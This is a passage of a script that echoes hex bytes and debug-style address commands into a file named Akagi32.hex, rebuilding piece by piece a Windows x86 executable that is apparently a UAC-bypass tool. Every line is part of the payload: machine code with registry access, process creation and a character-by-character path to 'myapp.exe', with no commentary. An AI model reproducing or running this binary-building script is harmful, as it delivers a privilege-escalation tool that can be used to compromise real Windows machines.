echo 74 06 8b 01 51 ff 50 08 f7 d6 c1 ee 1f 5f 8b c6 5e 5b 8b e5 5d c2 08 00 be 05 40 00 80 eb df 55 8b ec 81 ec 30 02 00 00 53 56 51 51 be 58 b0 40 00 8b ce e8 fb fe ff ff 8b d8 85 db 0f 84 b9 00 00 00 6a 08 59 8d 45 f4 c6 00 00 40 83 e9 01 75 f7 b9 08 02 00 00 8d 85 d0 fd ff ff c6 00 00 40 83 e9 01 75 f7 57 ba bc a5 40 00 8d 8d d0 fd ff ff e8 07 ac ff ff 8b d6 e8 68 ab ff ff 8b 35 28>>Akagi32.hex
echo e 5b00>>Akagi32.hex
echo 92 40 00 8d 85 d0 fd ff ff 50 8d 45 f4 50 ff d6 8d 45 f4 c7 45 d8 18 00 00 00 89 45 e0 33 ff 8d 45 d8 89 7d dc 50 68 00 00 00 02 8d 45 fc c7 45 e4 40 00 00 00 50 89 7d e8 89 7d ec ff 15 2c 92 40 00 85 c0 78 34 68 dc b0 40 00 8d 45 f4 89 7d f0 50 ff d6 6a 04 8d 45 f0 50 6a 04 57 8d 45 f4 50 ff 75 fc ff 15 10 92 40 00 ff 75 fc 33 db 85 c0 0f 99 c3 ff 15 48 92 40 00 5f 5e 8b c3 5b 8b>>Akagi32.hex
echo e 5b80>>Akagi32.hex
echo e5 5d c3 55 8b ec 51 53 56 57 8b fa 85 c9 74 38 85 ff 74 34 8b 75 08 85 f6 74 2d 33 c0 50 50 6a 02 50 50 68 00 00 00 40 51 ff 15 bc 90 40 00 8b d8 83 fb ff 75 1b ff 15 2c 91 40 00 8b d0 b9 f0 b0 40 00 e8 29 00 00 00 33 c0 5f 5e 5b 8b e5 5d c3 6a 00 8d 45 fc 50 56 57 53 ff 15 14 91 40 00 53 ff 15 fc 90 40 00 33 c0 39 75 fc 0f 94 c0 eb d9 53 56 57 8b f9 8b da be 04 01 00 00 85 ff 74>>Akagi32.hex
echo e 5c00>>Akagi32.hex
echo 07 e8 3f ab ff ff 03 f0 8d 04 36 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b f0 85 f6 74 55 ba 08 b1 40 00 8b ce e8 d1 aa ff ff 85 ff 74 07 8b d7 e8 2e aa ff ff ba 18 b1 40 00 8b ce e8 22 aa ff ff 8b ce e8 e8 aa ff ff 8b d0 8b cb e8 81 a9 ff ff ba 2c b1 40 00 8b ce e8 06 aa ff ff 56 ff 15 90 90 40 00 56 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 53 ff 15 d8 90 40 00 5f 5e 5b c3>>Akagi32.hex
echo e 5c80>>Akagi32.hex
echo 55 8b ec 83 e4 f8 83 ec 54 53 56 57 33 db 8d 44 24 20 6a 08 8b f2 89 5c 24 14 89 5c 24 20 89 5c 24 18 89 5c 24 1c 59 88 18 40 83 e9 01 75 f8 64 a1 18 00 00 00 8d 4c 24 20 53 53 51 8b 40 30 8b 40 10 ff 70 28 ff 15 4c 92 40 00 84 c0 0f 84 87 01 00 00 53 53 6a 21 6a 01 6a 07 53 53 8d 44 24 3c 89 5c 24 50 89 44 24 54 8d 44 24 44 50 8d 44 24 50 89 5c 24 60 50 68 01 00 10 00 8d 44 24 44>>Akagi32.hex
echo e 5d00>>Akagi32.hex
echo 89 5c 24 6c 8b 1d 3c 92 40 00 50 c7 44 24 5c 18 00 00 00 c7 44 24 68 40 00 00 00 ff d3 8b f8 8d 44 24 20 50 ff 15 50 92 40 00 85 ff 0f 88 15 01 00 00 68 ec a7 40 00 8d 44 24 24 50 ff 15 28 92 40 00 8b 44 24 1c 6a 18 5f 89 44 24 34 8d 44 24 20 89 44 24 38 33 c0 50 50 6a 60 6a 01 6a 01 68 80 00 00 00 50 89 44 24 5c 89 44 24 60 8d 44 24 44 50 8d 44 24 50 89 7c 24 50 50 68 01 00 10 00>>Akagi32.hex
echo e 5d80>>Akagi32.hex
echo 8d 44 24 38 c7 44 24 64 40 00 00 00 50 ff d3 85 c0 0f 88 a2 00 00 00 8b cf 8d 44 24 48 33 db 88 18 40 83 e9 01 75 f8 6a 05 57 8d 44 24 50 50 8d 44 24 34 50 ff 74 24 20 ff 15 88 92 40 00 85 c0 0f 88 94 00 00 00 8b 44 24 50 6a 04 68 00 30 00 00 89 44 24 20 8d 44 24 20 50 53 8d 44 24 24 50 6a ff ff 15 5c 92 40 00 85 c0 78 6e 53 53 ff 74 24 58 8d 44 24 34 ff 74 24 20 50 53 53 53 ff 74>>Akagi32.hex
echo e 5e00>>Akagi32.hex
echo 24 30 ff 15 d8 91 40 00 85 c0 78 0c 85 f6 74 4a 8b 44 24 50 89 06 eb 42 68 00 80 00 00 8d 44 24 1c 89 5c 24 1c 50 8d 44 24 1c 50 6a ff ff 15 60 92 40 00 89 5c 24 14 eb 21 50 ff 15 f8 91 40 00 b9 f0 b0 40 00 eb 0c 57 ff 15 f8 91 40 00 b9 30 b1 40 00 8b d0 e8 97 fd ff ff 83 7c 24 1c 00 8b 35 48 92 40 00 74 06 ff 74 24 1c ff d6 83 7c 24 10 00 74 06 ff 74 24 10 ff d6 8b 44 24 14 5f 5e>>Akagi32.hex
echo e 5e80>>Akagi32.hex
echo 5b 8b e5 5d c3 55 8b ec 83 ec 3c 8d 45 c4 56 6a 3c 5e c6 00 00 40 83 ee 01 75 f7 85 c9 75 04 33 c0 eb 48 83 65 dc 00 8d 45 c4 50 c7 45 c4 3c 00 00 00 c7 45 c8 40 00 00 00 89 4d d4 89 55 d8 c7 45 e0 05 00 00 00 ff 15 78 91 40 00 8b f0 85 f6 74 17 68 00 80 00 00 ff 75 fc ff 15 e4 90 40 00 ff 75 fc ff 15 fc 90 40 00 8b c6 5e 8b e5 5d c3 55 8b ec 83 ec 54 56 8b 75 10 85 f6 74 03 83 26>>Akagi32.hex
echo e 5f00>>Akagi32.hex
echo 00 83 7d 08 00 75 07 33 c0 e9 ac 00 00 00 8b 4d 08 53 e8 2e a8 ff ff 8d 04 45 02 00 00 00 50 6a 08 ff 35 84 e0 40 00 ff 15 e8 91 40 00 8b d8 85 db 0f 84 82 00 00 00 8b 55 08 8b cb e8 bc a7 ff ff 6a 10 59 8d 45 f0 c6 00 00 40 83 e9 01 75 f7 6a 44 5a 8b ca 8d 45 ac c6 00 00 40 83 e9 01 75 f7 8d 45 ac 89 55 ac 50 ff 15 94 90 40 00 8d 45 f0 50 8d 45 ac 50 ff 75 0c 33 c0 50 68 24 00 00>>Akagi32.hex
echo e 5f80>>Akagi32.hex
echo 04 50 50 50 53 ff 75 14 50 ff 15 00 90 40 00 85 c0 74 14 85 f6 74 07 8b 45 f4 89 06 eb 09 ff 75 f4 ff 15 fc 90 40 00 53 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 8b 45 f0 5b 5e 8b e5 5d c2 10 00 55 8b ec 85 c9 74 25 56 8b 75 08 85 f6 74 1c 85 d2 74 18 3b 55 0c 0f 43 55 0c 85 d2 74 0d 2b f1 8a 04 0e 88 01 41 83 ea 01 75 f5 5e 5d c3 55 8b ec 51 51 53 57 33 ff 89 4d f8 57 8d 45 fc 89>>Akagi32.hex
echo e 6000>>Akagi32.hex
echo 7d fc 50 57 68 3f 00 0f 00 57 57 57 68 4c b1 40 00 68 01 00 00 80 8b da ff 15 14 90 40 00 85 c0 75 39 39 7d fc 74 43 6a 04 68 9c e0 40 00 6a 04 57 68 6c b1 40 00 ff 75 fc ff 15 08 90 40 00 53 ff 75 f8 6a 01 57 68 78 b1 40 00 ff 75 fc ff 15 08 90 40 00 8b f8 f7 df 1b ff 47 83 7d fc 00 74 09 ff 75 fc ff 15 0c 90 40 00 8b c7 5f 5b 8b e5 5d c3 55 8b ec 51 51 53 8b da 8b c1 56 57 33 f6>>Akagi32.hex
echo e 6080>>Akagi32.hex
echo 89 45 f8 8d 7b 01 8b d0 d1 ef 74 17 0f b7 02 83 c2 02 03 f0 8b ce 0f b7 f6 c1 e9 10 03 f1 83 ef 01 75 e9 ff 75 f8 8b c6 c1 e8 10 03 c6 0f b7 c0 89 45 fc ff 15 e0 91 40 00 8b f0 85 f6 74 2a 8b 7e 58 66 8b 55 fc 0f b7 cf 66 3b d1 1b c0 f7 d8 66 03 c1 0f b7 4e 5a 66 2b d0 66 3b d1 1b c0 f7 d8 66 03 c1 66 2b d0 eb 0a 83 65 fc 00 8b fb 66 8b 55 fc 0f b7 c2 03 c3 3b c7 5f 5e 0f 94 c0 5b>>Akagi32.hex
echo e 6100>>Akagi32.hex
echo 8b e5 5d c3 85 c9 74 15 6a 40 68 90 b1 40 00 51 ff 15 9c 91 40 00 50 ff 15 a0 91 40 00 c3 6a 04 68 90 b1 40 00 51 ff 15 9c 91 40 00 50 ff 15 a0 91 40 00 c3 55 8b ec 83 ec 18 56 33 c0 8b f2 89 45 f8 89 45 fc 85 f6 74 44 89 45 f0 8d 45 f4 50 6a 03 8d 45 e8 c7 45 e8 0a 00 00 00 50 56 89 4d ec ff 15 d4 91 40 00 85 c0 78 22 8d 45 fc 50 8d 45 f8 50 ff 75 f4 56 ff 15 04 92 40 00 85 c0 78>>Akagi32.hex
echo e 6180>>Akagi32.hex
echo 0c 8b 4d 08 85 c9 74 05 8b 45 fc 89 01 8b 45 f8 5e 8b e5 5d c3 55 8b ec 8b 45 0c 57 8b 7d 08 8b 4f 18 3b 48 08 75 27 ff 35 54 d4 40 00 8d 47 24 50 ff 15 28 92 40 00 68 9c b1 40 00 8d 47 2c 50 ff 15 28 92 40 00 8b 45 10 c6 00 01 eb 06 8b 45 10 c6 00 00 5f 5d c2 0c 00 55 8b ec 64 a1 18 00 00 00 81 ec 14 04 00 00 b9 10 04 00 00 53 56 57 8b 78 30 33 db 8d 85 ec fb ff ff 88 18 40 83 e9>>Akagi32.hex
echo e 6200>>Akagi32.hex
echo 01 75 f8 be 04 01 00 00 8d 85 ec fb ff ff 56 50 ff 15 34 91 40 00 85 c0 0f 84 a5 00 00 00 3b c6 0f 83 9d 00 00 00 ba 80 a8 40 00 8d 8d ec fb ff ff e8 2f a4 ff ff ba 9c b1 40 00 8d 8d ec fb ff ff e8 1f a4 ff ff 6a 04 68 00 30 00 00 8d 45 fc 89 1d 54 d4 40 00 50 53 68 54 d4 40 00 6a ff c7 45 fc 00 10 00 00 ff 15 5c 92 40 00 8b 0d 54 d4 40 00 85 c9 74 4d 8d 95 ec fb ff ff e8 7c a4 ff>>Akagi32.hex
echo e 6280>>Akagi32.hex
echo ff ff 77 1c ff 15 e4 91 40 00 8b 47 10 ff 35 54 d4 40 00 8b 35 28 92 40 00 83 c0 38 50 ff d6 8b 47 10 68 b8 b1 40 00 83 c0 40 50 ff d6 ff 77 1c ff 15 f4 91 40 00 57 68 95 6c 40 00 53 ff 15 24 92 40 00 5f 5e 5b 8b e5 5d c3 55 8b ec 83 ec 1c 8d 45 e8 56 57 6a 08 8b fa 5e c6 00 00 40 83 ee 01 75 f7 51 8d 45 e8 50 ff 15 28 92 40 00 21 75 f8 8d 45 f8 50 8d 45 f0 89 7d f4 50 8d 45 e8 c7>>Akagi32.hex
echo e 6300>>Akagi32.hex
echo 45 f0 00 00 08 02 50 56 ff 15 00 92 40 00 85 c0 79 19 3d 23 00 00 c0 74 12 50 ff 15 f8 91 40 00 50 ff 15 8c 92 40 00 33 c0 eb 05 8b 45 f8 d1 e8 5f 5e 8b e5 5d c3 55 8b ec 81 ec 20 02 00 00 6a 3a 58 6a 5c 66 89 45 e8 58 6a 6d 66 89 45 ea 58 6a 79 66 89 45 ec 58 6a 61 66 89 45 ee 58 6a 70 66 89 45 f0 58 6a 2e 66 89 45 f2 66 89 45 f4 58 6a 65 59 66 89 45 f6 6a 78 58 66 89 45 fa 33 c0>>Akagi32.hex
echo e 6380>>Akagi32.hex
echo 66 89 4d f8 66 89 4d fc b9 08 02 00 00 66 89 45 fe 8d 85 e0 fd ff ff c6 00 00 40 83 e9 01 75 f7 68 04 01 00 00 8d 85 e0 fd ff ff 50 51 ff 15 98 90 40 00 8d 55 e8 8d 8d e0 fd ff ff e8 ef a3 ff ff 85 c0 74 08 6a 00 ff 15 24 91 40 00 8b e5 5d c3 55 8b ec 51 53 57 8b 7d 0c 33 db 85 ff 0f 84 b5 00 00 00 56 8b 75 08 85 f6 0f 84 a8 00 00 00 8b 4e 30 85 c9 0f 84 9d 00 00 00 8b 76 28 85 f6>>Akagi32.hex
echo e 6400>>Akagi32.hex
echo 0f 84 92 00 00 00 8b 17 e8 91 a2 ff ff 85 c0 0f 85 83 00 00 00 8b 57 04 8b ce e8 91 a3 ff ff 85 c0 74 75 8b 57 08 8b ce 89 75 08 8b fa 89 75 0c 85 d2 74 57 0f b7 06 66 85 c0 8b c1 74 1b 0f b7 06 66 83 f8 5c 0f 44 ce 83 c6 02 0f b7 06 66 85 c0 75 ee 8b 45 0c 89 4d 08 21 5d fc 2b c8 41 8b f3 d1 e9 3b 45 08 0f 47 4d fc 85 c9 74 16 8b 5d 0c 2b da 66 8b 04 3b 66 89 07 83 c7 02 46 3b f1>>Akagi32.hex
echo e 6480>>Akagi32.hex
echo 72 f1 33 db 33 c0 66 89 07 eb 02 8b d3 33 c9 0f b6 db 41 85 d2 0f 45 d9 5e 8b 45 10 5f 88 18 5b 8b e5 5d c2 0c 00 55 8b ec 83 ec 18 53 56 57 33 db 8d 45 f0 6a 08 8b fa 89 5d fc 89 5d f8 5e 88 18 40 83 ee 01 75 f8 51 8d 45 f0 50 ff 15 28 92 40 00 8d 45 fc 50 8d 45 f0 50 53 53 ff 15 cc 91 40 00 85 c0 79 04 33 c0 eb 29 57 8d 45 e8 50 ff 15 f0 91 40 00 8d 45 f8 50 53 8d 45 e8 50 ff 75>>Akagi32.hex
echo e 6500>>Akagi32.hex
echo fc ff 15 08 92 40 00 8b 4d f8 33 d2 85 c0 0f 48 ca 8b c1 5f 5e 5b 8b e5 5d c3 cc cc cc cc cc cc 68 78 70 40 00 64 a1 00 00 00 00 50 8b 44 24 10 89 6c 24 10 8d 6c 24 10 2b e0 53 56 57 8b 45 f8 89 65 e8 50 8b 45 fc c7 45 fc ff ff ff ff 89 45 f8 8d 45 f0 64 a3 00 00 00 00 f2 c3 8b 4d f0 64 89 0d 00 00 00 00 59 5f 5e 5b c9 51 f2 c3 cc cc 56 43 32 30 58 43 30 30 55 8b ec 83 ec 08 53 56>>Akagi32.hex
echo e 6580>>Akagi32.hex
echo 57 55 fc ff 75 10 e8 49 0c 00 00 83 c4 04 8b 5d 0c 8b 45 08 f7 40 04 06 00 00 00 0f 85 c3 00 00 00 89 45 f8 8b 45 10 89 45 fc 8d 45 f8 89 43 fc 8b 73 0c 8b 7b 08 53 e8 b4 08 00 00 83 c4 04 0b c0 0f 8e 8f 00 00 00 83 fe ff 0f 84 8d 00 00 00 8d 0c 76 8b 44 8f 04 0b c0 74 66 56 55 8d 6b 10 33 db 33 c9 33 d2 33 f6 33 ff ff d0 5d 5e 8b 5d 0c 0b c0 74 4c 78 58 6a 01 ff 75 08 e8 23 06 00>>Akagi32.hex
echo e 6600>>Akagi32.hex
echo 00 83 c4 08 8b 7b 08 53 e8 63 06 00 00 83 c4 04 8d 6b 10 56 53 e8 bb 06 00 00 83 c4 08 8d 0c 76 6a 01 8b 44 8f 08 e8 5a 07 00 00 8b 04 8f 89 43 0c 8b 44 8f 08 33 db 33 c9 33 d2 33 f6 33 ff ff d0 8b 7b 08 8d 0c 76 8b 34 8f e9 78 ff ff ff b8 00 00 00 00 eb 23 8b 45 08 83 48 04 08 b8 01 00 00 00 eb 15 55 8d 6b 10 6a ff 53 e8 65 06 00 00 83 c4 08 5d b8 01 00 00 00 5d 5f 5e 5b 8b e5 5d>>Akagi32.hex
echo e 6680>>Akagi32.hex
echo c3 55 ff 74 24 08 e8 49 0b 00 00 83 c4 04 8b 4c 24 08 8b 29 8b 41 1c 50 8b 41 18 50 e8 34 06 00 00 83 c4 08 5d c2 04 00 cc cc cc cc cc cc cc cc 57 56 8b 74 24 10 8b 4c 24 14 8b 7c 24 0c 8b c1 8b d1 03 c6 3b fe 76 08 3b f8 0f 82 94 02 00 00 83 f9 20 0f 82 d2 04 00 00 81 f9 80 00 00 00 73 13 0f ba 25 20 d4 40 00 01 0f 82 8e 04 00 00 e9 e3 01 00 00 0f ba 25 e4 d4 40 00 01 73 09 f3 a4>>Akagi32.hex
echo e 6700>>Akagi32.hex
echo 8b 44 24 0c 5e 5f c3 8b c7 33 c6 a9 0f 00 00 00 75 0e 0f ba 25 20 d4 40 00 01 0f 82 e0 03 00 00 0f ba 25 e4 d4 40 00 00 0f 83 a9 01 00 00 f7 c7 03 00 00 00 0f 85 9d 01 00 00 f7 c6 03 00 00 00 0f 85 ac 01 00 00 0f ba e7 02 73 0d 8b 06 83 e9 04 8d 76 04 89 07 8d 7f 04 0f ba e7 03 73 11 f3 0f 7e 0e 83 e9 08 8d 76 08 66 0f d6 0f 8d 7f 08 f7 c6 07 00 00 00 74 65 0f ba e6 03 0f 83 b4 00>>Akagi32.hex
echo e 6780>>Akagi32.hex
echo 00 00 66 0f 6f 4e f4 8d 76 f4 8b ff 66 0f 6f 5e 10 83 e9 30 66 0f 6f 46 20 66 0f 6f 6e 30 8d 76 30 83 f9 30 66 0f 6f d3 66 0f 3a 0f d9 0c 66 0f 7f 1f 66 0f 6f e0 66 0f 3a 0f c2 0c 66 0f 7f 47 10 66 0f 6f cd 66 0f 3a 0f ec 0c 66 0f 7f 6f 20 8d 7f 30 7d b7 8d 76 0c e9 af 00 00 00 66 0f 6f 4e f8 8d 76 f8 8d 49 00 66 0f 6f 5e 10 83 e9 30 66 0f 6f 46 20 66 0f 6f 6e 30 8d 76 30 83 f9 30>>Akagi32.hex
echo e 6800>>Akagi32.hex
echo 66 0f 6f d3 66 0f 3a 0f d9 08 66 0f 7f 1f 66 0f 6f e0 66 0f 3a 0f c2 08 66 0f 7f 47 10 66 0f 6f cd 66 0f 3a 0f ec 08 66 0f 7f 6f 20 8d 7f 30 7d b7 8d 76 08 eb 56 66 0f 6f 4e fc 8d 76 fc 8b ff 66 0f 6f 5e 10 83 e9 30 66 0f 6f 46 20 66 0f 6f 6e 30 8d 76 30 83 f9 30 66 0f 6f d3 66 0f 3a 0f d9 04 66 0f 7f 1f 66 0f 6f e0 66 0f 3a 0f c2 04 66 0f 7f 47 10 66 0f 6f cd 66 0f 3a 0f ec 04 66>>Akagi32.hex
echo e 6880>>Akagi32.hex
echo 0f 7f 6f 20 8d 7f 30 7d b7 8d 76 04 83 f9 10 7c 13 f3 0f 6f 0e 83 e9 10 8d 76 10 66 0f 7f 0f 8d 7f 10 eb e8 0f ba e1 02 73 0d 8b 06 83 e9 04 8d 76 04 89 07 8d 7f 04 0f ba e1 03 73 11 f3 0f 7e 0e 83 e9 08 8d 76 08 66 0f d6 0f 8d 7f 08 8b 04 8d 14 74 40 00 ff e0 f7 c7 03 00 00 00 74 13 8a 06 88 07 49 83 c6 01 83 c7 01 f7 c7 03 00 00 00 75 ed 8b d1 83 f9 20 0f 82 ae 02 00 00 c1 e9 02>>Akagi32.hex
echo e 6900>>Akagi32.hex
echo f3 a5 83 e2 03 ff 24 95 14 74 40 00 ff 24 8d 24 74 40 00 90 24 74 40 00 2c 74 40 00 38 74 40 00 4c 74 40 00 8b 44 24 0c 5e 5f c3 90 8a 06 88 07 8b 44 24 0c 5e 5f c3 90 8a 06 88 07 8a 46 01 88 47 01 8b 44 24 0c 5e 5f c3 8d 49 00 8a 06 88 07 8a 46 01 88 47 01 8a 46 02 88 47 02 8b 44 24 0c 5e 5f c3 90 8d 34 31 8d 3c 39 83 f9 20 0f 82 51 01 00 00 0f ba 25 20 d4 40 00 01 0f 82 94 00 00>>Akagi32.hex
echo e 6980>>Akagi32.hex
echo 00 f7 c7 03 00 00 00 74 14 8b d7 83 e2 03 2b ca 8a 46 ff 88 47 ff 4e 4f 83 ea 01 75 f3 83 f9 20 0f 82 1e 01 00 00 8b d1 c1 e9 02 83 e2 03 83 ee 04 83 ef 04 fd f3 a5 fc ff 24 95 c0 74 40 00 90 d0 74 40 00 d8 74 40 00 e8 74 40 00 fc 74 40 00 8b 44 24 0c 5e 5f c3 90 8a 46 03 88 47 03 8b 44 24 0c 5e 5f c3 8d 49 00 8a 46 03 88 47 03 8a 46 02 88 47 02 8b 44 24 0c 5e 5f c3 90 8a 46 03 88>>Akagi32.hex
echo e 6a00>>Akagi32.hex
echo 47 03 8a 46 02 88 47 02 8a 46 01 88 47 01 8b 44 24 0c 5e 5f c3 f7 c7 0f 00 00 00 74 0f 49 4e 4f 8a 06 88 07 f7 c7 0f 00 00 00 75 f1 81 f9 80 00 00 00 72 68 81 ee 80 00 00 00 81 ef 80 00 00 00 f3 0f 6f 06 f3 0f 6f 4e 10 f3 0f 6f 56 20 f3 0f 6f 5e 30 f3 0f 6f 66 40 f3 0f 6f 6e 50 f3 0f 6f 76 60 f3 0f 6f 7e 70 f3 0f 7f 07 f3 0f 7f 4f 10 f3 0f 7f 57 20 f3 0f 7f 5f 30 f3 0f 7f 67 40 f3>>Akagi32.hex
echo e 6a80>>Akagi32.hex
echo 0f 7f 6f 50 f3 0f 7f 77 60 f3 0f 7f 7f 70 81 e9 80 00 00 00 f7 c1 80 ff ff ff 75 90 83 f9 20 72 23 83 ee 20 83 ef 20 f3 0f 6f 06 f3 0f 6f 4e 10 f3 0f 7f 07 f3 0f 7f 4f 10 83 e9 20 f7 c1 e0 ff ff ff 75 dd f7 c1 fc ff ff ff 74 15 83 ef 04 83 ee 04 8b 06 89 07 83 e9 04 f7 c1 fc ff ff ff 75 eb 85 c9 74 0f 83 ef 01 83 ee 01 8a 06 88 07 83 e9 01 75 f1 8b 44 24 0c 5e 5f c3 eb 03 cc cc cc>>Akagi32.hex
echo e 6b00>>Akagi32.hex
echo 8b c6 83 e0 0f 85 c0 0f 85 e3 00 00 00 8b d1 83 e1 7f c1 ea 07 74 66 8d a4 24 00 00 00 00 8b ff 66 0f 6f 06 66 0f 6f 4e 10 66 0f 6f 56 20 66 0f 6f 5e 30 66 0f 7f 07 66 0f 7f 4f 10 66 0f 7f 57 20 66 0f 7f 5f 30 66 0f 6f 66 40 66 0f 6f 6e 50 66 0f 6f 76 60 66 0f 6f 7e 70 66 0f 7f 67 40 66 0f 7f 6f 50 66 0f 7f 77 60 66 0f 7f 7f 70 8d b6 80 00 00 00 8d bf 80 00 00 00 4a 75 a3 85 c9 74>>Akagi32.hex
echo e 6b80>>Akagi32.hex
echo 5f 8b d1 c1 ea 05 85 d2 74 21 8d 9b 00 00 00 00 f3 0f 6f 06 f3 0f 6f 4e 10 f3 0f 7f 07 f3 0f 7f 4f 10 8d 76 20 8d 7f 20 4a 75 e5 83 e1 1f 74 30 8b c1 c1 e9 02 74 0f 8b 16 89 17 83 c7 04 83 c6 04 83 e9 01 75 f1 8b c8 83 e1 03 74 13 8a 06 88 07 46 47 49 75 f7 8d a4 24 00 00 00 00 8d 49 00 8b 44 24 0c 5e 5f c3 8d a4 24 00 00 00 00 8b ff ba 10 00 00 00 2b d0 2b ca 51 8b c2 8b c8 83 e1>>Akagi32.hex
echo e 6c00>>Akagi32.hex
echo 03 74 09 8a 16 88 17 46 47 49 75 f7 c1 e8 02 74 0d 8b 16 89 17 8d 76 04 8d 7f 04 48 75 f3 59 e9 e9 fe ff ff 55 8b ec 56 8b 75 08 81 3e 63 73 6d e0 75 2d 83 3d 04 d8 40 00 00 74 24 68 04 d8 40 00 e8 0a 09 00 00 59 85 c0 74 15 ff 75 0c 56 8b 35 04 d8 40 00 8b ce e8 98 08 00 00 ff d6 59 59 5e 5d c3 cc cc cc cc cc cc cc cc cc cc cc cc cc 55 8b ec 53 56 57 55 6a 00 6a 00 68 88 77 40 00>>Akagi32.hex
echo e 6c80>>Akagi32.hex
echo ff 75 08 e8 66 08 00 00 5d 5f 5e 5b 8b e5 5d c3 8b 4c 24 04 f7 41 04 06 00 00 00 b8 01 00 00 00 74 32 8b 44 24 14 8b 48 fc 33 c8 e8 91 09 00 00 55 8b 68 10 8b 50 28 52 8b 50 24 52 e8 14 00 00 00 83 c4 08 5d 8b 44 24 08 8b 54 24 10 89 02 b8 03 00 00 00 c3 53 56 57 8b 44 24 10 55 50 6a fe 68 90 77 40 00 64 ff 35 00 00 00 00 a1 28 d4 40 00 33 c4 50 8d 44 24 04 64 a3 00 00 00 00 8b 44>>Akagi32.hex
echo e 6d00>>Akagi32.hex
echo 24 28 8b 58 08 8b 70 0c 83 fe ff 74 3a 83 7c 24 2c ff 74 06 3b 74 24 2c 76 2d 8d 34 76 8b 0c b3 89 4c 24 0c 89 48 0c 83 7c b3 04 00 75 17 68 01 01 00 00 8b 44 b3 08 e8 49 00 00 00 8b 44 b3 08 e8 5f 00 00 00 eb b7 8b 4c 24 04 64 89 0d 00 00 00 00 83 c4 18 5f 5e 5b c3 33 c0 64 8b 0d 00 00 00 00 81 79 04 90 77 40 00 75 10 8b 51 0c 8b 52 0c 39 51 08 75 05 b8 01 00 00 00 c3 53 51 bb 10>>Akagi32.hex
echo e 6d80>>Akagi32.hex
echo d4 40 00 eb 0b 53 51 bb 10 d4 40 00 8b 4c 24 0c 89 4b 08 89 43 04 89 6b 0c 55 51 50 58 59 5d 59 5b c2 04 00 ff d0 c3 cc cc cc cc cc cc cc cc cc 55 8b ec 8b 4d 10 33 c0 53 56 83 ca ff 57 83 f9 ff 0f 84 96 00 00 00 8b 7d 08 8d 9b 00 00 00 00 8b 5d 0c 8d 0c 49 8b 74 8b 08 8d 1c 8b 2b f7 81 e6 00 f0 ff ff 3b f2 74 2d 85 c0 74 10 8b 50 0c 3b f2 72 09 8b 48 08 03 ca 3b f1 72 17 56 57 e8>>Akagi32.hex
echo e 6e00>>Akagi32.hex
echo fc 06 00 00 83 c4 08 85 c0 74 5c f7 40 24 00 00 00 20 74 53 8b d6 8b 73 04 85 f6 74 35 2b f7 81 e6 00 f0 ff ff 3b f2 74 29 8b 50 0c 3b f2 72 09 8b 48 08 03 ca 3b f1 72 17 56 57 e8 c0 06 00 00 83 c4 08 85 c0 74 20 f7 40 24 00 00 00 20 74 17 8b d6 8b 0b 83 f9 ff 0f 85 73 ff ff ff 5f 5e b8 01 00 00 00 5b 5d c3 5f 5e 33 c0 5b 5d c3 cc cc 55 8b ec 6a fe 68 40 b4 40 00 68 20 7d 40 00 64>>Akagi32.hex
echo e 6e80>>Akagi32.hex
echo a1 00 00 00 00 50 83 ec 38 53 56 57 a1 28 d4 40 00 31 45 f8 33 c5 50 8d 45 f0 64 a3 00 00 00 00 89 65 e8 8b 7d 08 8b 5f 08 89 5d dc 89 5d d4 f6 c3 03 74 14 33 c0 8b 4d f0 64 89 0d 00 00 00 00 59 5f 5e 5b 8b e5 5d c3 64 a1 18 00 00 00 8b 48 08 89 4d d8 3b d9 72 05 3b 58 04 72 d7 8b 57 0c 89 55 e4 83 fa ff 0f 84 d1 02 00 00 c7 45 e0 00 00 00 00 33 c9 8b c3 8b 30 83 fe ff 74 04 3b f1>>Akagi32.hex
echo e 6f00>>Akagi32.hex
echo 73 b2 83 78 04 00 74 0a be 01 00 00 00 89 75 e0 eb 03 8b 75 e0 41 83 c0 0c 3b ca 76 da 85 f6 74 0c 8b 47 f8 3b 45 d8 72 8b 3b c7 73 87 8b fb 81 e7 00 f0 ff ff 89 7d d8 33 f6 8b 0d d8 d4 40 00 3b f1 0f 8d 44 01 00 00 8b 04 f5 58 d4 40 00 89 45 e0 8b 1c f5 5c d4 40 00 3b c7 0f 85 22 01 00 00 c7 45 fc 00 00 00 00 53 e8 a2 06 00 00 83 c4 04 85 c0 0f 84 d3 00 00 00 ff 75 e4 ff 75 dc 53>>Akagi32.hex
echo e 6f80>>Akagi32.hex
echo e8 2b fe ff ff 83 c4 0c 85 c0 0f 84 bc 00 00 00 8b 45 08 8b 40 04 2b c3 50 53 e8 61 05 00 00 83 c4 08 85 c0 0f 84 a2 00 00 00 c7 45 fc fe ff ff ff 85 f6 0f 8e 04 02 00 00 b8 01 00 00 00 b9 dc d4 40 00 87 01 85 c0 0f 85 f0 01 00 00 39 3c f5 58 d4 40 00 74 41 a1 d8 d4 40 00 8d 70 ff 85 f6 78 0e 39 3c f5 58 d4 40 00 74 1c 83 ee 01 79 f2 8b 7d e0 85 f6 79 25 83 f8 10 7d 06 40 a3 d8 d4>>Akagi32.hex
echo e 7000>>Akagi32.hex
echo 40 00 8d 70 ff eb 13 8b 3c f5 58 d4 40 00 8b 1c f5 5c d4 40 00 eb dc 8b 7d e0 85 f6 7e 25 85 f6 78 21 ba 58 d4 40 00 46 8b 02 8b 4a 04 89 3a 89 5a 04 8b f8 8b d9 8d 52 08 83 ee 01 75 ea b9 dc d4 40 00 33 c0 87 01 e9 71 01 00 00 c7 45 fc fe ff ff ff 8b 5d dc 8b 75 e4 eb 33 8b 45 ec 8b 00 33 c9 81 38 05 00 00 c0 0f 94 c1 8b c1 c3 8b 65 e8 c7 45 fc fe ff ff ff 8b 5d d4 8b 75 e4 8b 7d>>Akagi32.hex
echo e 7080>>Akagi32.hex
echo d8 eb 0b 46 8b 5d dc e9 b4 fe ff ff 8b f2 6a 1c 8d 45 b8 50 53 ff 15 b4 90 40 00 85 c0 0f 84 1a 01 00 00 81 7d d0 00 00 00 01 74 15 83 c8 ff 8b 4d f0 64 89 0d 00 00 00 00 59 5f 5e 5b 8b e5 5d c3 8b 45 bc 89 45 dc 50 e8 43 05 00 00 83 c4 04 85 c0 74 d8 f6 45 cc cc 74 23 8b c3 8b 4d dc 2b c1 50 51 e8 18 04 00 00 83 c4 08 85 c0 0f 84 c1 fd ff ff 83 78 24 00 0f 8c b7 fd ff ff 56 53 8b>>Akagi32.hex
echo e 7100>>Akagi32.hex
